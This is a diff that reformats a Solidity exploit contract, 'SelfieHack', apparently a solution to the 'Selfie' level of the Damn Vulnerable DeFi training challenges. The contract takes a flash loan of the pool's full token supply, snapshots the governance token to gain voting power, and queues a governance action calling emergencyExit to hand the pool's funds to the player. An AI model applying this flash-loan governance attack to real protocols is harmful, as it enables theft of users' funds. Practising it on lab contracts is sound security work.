@@ -16,15 +16,9 @@ contract SelfieHack is IERC3156FlashBorrower {
 
     uint256 public actionId;
 
-    bytes32 private constant CALLBACK_SUCCESS =
-        keccak256("ERC3156FlashBorrower.onFlashLoan");
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
 
-    constructor(
-        address _pool,
-        address _governance,
-        address _token,
-        address _player
-    ) {
+    constructor(address _pool, address _governance, address _token, address _player) {
         pool = SelfiePool(_pool);
         governance = SimpleGovernance(_governance);
         token = DamnValuableTokenSnapshot(_token);
@@ -32,32 +26,21 @@ contract SelfieHack is IERC3156FlashBorrower {
     }
 
     function pwn() external {
-        pool.flashLoan(
-            this,
-            address(token),
-            pool.maxFlashLoan(address(token)),
-            "0x"
-        );
+        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "0x");
     }
 
-    function onFlashLoan(
-        address initiator,
-        address _token,
-        uint256 amount,
-        uint256,
-        bytes memory
-    ) external override returns (bytes32) {
+    function onFlashLoan(address initiator, address _token, uint256 amount, uint256, bytes memory)
+        external
+        override
+        returns (bytes32)
+    {
         require(msg.sender == address(pool), "SelfieHack: not from pool");
         require(initiator == address(this), "SelfieHack: not from self");
 
         DamnValuableTokenSnapshot t = DamnValuableTokenSnapshot(_token);
         t.snapshot();
         t.approve(address(pool), amount);
-        actionId = governance.queueAction(
-            address(pool),
-            0,
-            abi.encodeWithSelector(pool.emergencyExit.selector, player)
-        );
+        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSelector(pool.emergencyExit.selector, player));
 
         return CALLBACK_SUCCESS;
     }
